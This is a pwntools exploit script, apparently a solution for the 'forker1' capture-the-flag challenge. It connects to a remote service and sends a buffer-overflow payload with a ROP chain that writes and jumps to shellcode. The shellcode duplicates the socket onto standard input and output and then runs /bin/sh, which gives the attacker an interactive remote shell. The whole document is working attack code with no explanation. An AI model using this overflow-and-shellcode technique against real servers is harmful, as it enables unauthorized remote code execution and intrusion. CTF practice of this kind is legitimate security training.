from pwn import *

r = remote("forker1.wpictf.xyz",31337)

context.arch = "amd64"

shellcode = asm("""
xor rax,rax
mov al,0x4
push rax
pop rdi
mov al,0x0
push rax
pop rsi
mov al,0x21
syscall
xor rax,rax
mov al,0x4
push rax
pop rdi
mov al,0x1
push rax
pop rsi
mov al,0x21
syscall
mov al,0x4
push rax
pop rdi
mov al,0x2
push rax
pop rsi
mov al,0x21
syscall
xor rdx,rdx
xor rsi,rsi
mov rdi,0x0068732f6e69622f
push rdi
mov rdi,rsp
xor rax,rax
mov al,0x3b
syscall
""")

payload = "a"*0x4c+"\x4d"+"\x00"*3+p64(0x602300)+p64(0x0400c06)
payload += flat([0x0,0x0,0x1,0x602050,0x4,0x602300,len(shellcode),0x400bf0])
payload += flat([0x0]*7,[0x602300,])

print ("\x0a" in payload)
input()
r.sendline(payload)
r.send(shellcode)

r.interactive()
